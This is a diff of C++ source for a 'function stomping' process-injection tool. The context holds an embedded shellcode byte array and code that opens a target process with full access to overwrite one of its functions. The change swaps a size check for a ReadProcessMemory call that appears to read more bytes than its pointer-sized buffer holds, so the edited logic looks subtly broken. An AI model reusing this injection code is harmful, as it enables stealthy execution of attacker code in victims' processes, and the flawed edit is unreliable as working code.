@@ -33,6 +33,7 @@ unsigned char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x0
 
 int FunctionStomping(DWORD pid)
 {
+    DWORD oldPermissions;
     HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 
     if (procHandle == 0 || procHandle == INVALID_HANDLE_VALUE) {
@@ -60,11 +61,11 @@ int FunctionStomping(DWORD pid)
     std::cout << "[+] Got function base!" << std::endl;
 
     // Verifying that the shellcode isn't too big.
-    DWORD oldPermissions;
     SIZE_T sizeToWrite = sizeof(shellcode);
-
-    if (sizeToWrite > 0x1000) {
-        std::cerr << "[-] Cannot write more than 4096 bytes! " << std::endl;
+    BYTE* oldFunction;
+    
+    if (!ReadProcessMemory(procHandle, functionBase, &oldFunction, sizeToWrite, NULL)) {
+        std::cerr << "[-] Shellcode is too big!" << std::endl;
         CloseHandle(procHandle);
         return -1;
     }
